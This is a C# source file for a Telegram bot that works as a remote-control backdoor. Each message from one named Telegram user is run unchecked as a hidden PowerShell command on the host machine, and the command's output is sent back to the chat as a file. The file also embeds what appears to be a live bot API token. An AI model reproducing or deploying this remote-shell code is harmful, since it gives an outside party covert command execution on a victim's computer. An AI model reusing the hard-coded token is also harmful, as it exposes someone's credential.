using System.Diagnostics;
using System.Text;
using Telegram.Bot;
using Telegram.Bot.Extensions.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;

var botClient = new TelegramBotClient("1360871763:AAEngq_0nJBt--P0f0DMNu_i3JPkuFnGFws");

await botClient.ReceiveAsync(
    HandleUpdateAsync,
    HandleErrorAsync,
    new ReceiverOptions { AllowedUpdates = new UpdateType[] {UpdateType.Message, UpdateType.CallbackQuery}}
);

var powershell = new powerShellProc("echo hello");


string output = powershell.Run();
System.Console.WriteLine(output);

async Task HandleErrorAsync(ITelegramBotClient arg1, Exception arg2, CancellationToken arg3)
{
    await Task.CompletedTask;
}

async Task HandleUpdateAsync(ITelegramBotClient arg1, Update update, CancellationToken arg3)
{
    if (update.Message is Message message)
        if (message.Text is string text && message.From!.Username == "RobCK")
        {
            // switch (text.Split().First())
            // {
            //     case "/cmd":
            //     break;
            //     default:
            // }
            var proc = new powerShellProc(text);
            var outp = proc.Run();
            using (var stream1 = new MemoryStream(
                    buffer: new UnicodeEncoding().GetBytes(outp)
                )
            )
            await botClient.SendDocumentAsync(
                message.Chat.Id,
                new Telegram.Bot.Types.InputFiles.InputOnlineFile
                (stream1, "output.txt"),
                replyToMessageId: message.MessageId
            );
        }

}
internal class powerShellProc
{
    private Process _process;

    public powerShellProc(string arg)
    {
        _process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "powershell",
                Arguments = arg,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
            },
        };
        
        
    }

    internal string Run()
    {
        _process.Start();
        var outp = _process.StandardOutput.ReadToEnd();
        outp += _process.StandardError.ReadToEnd();
        return outp;
    }
}
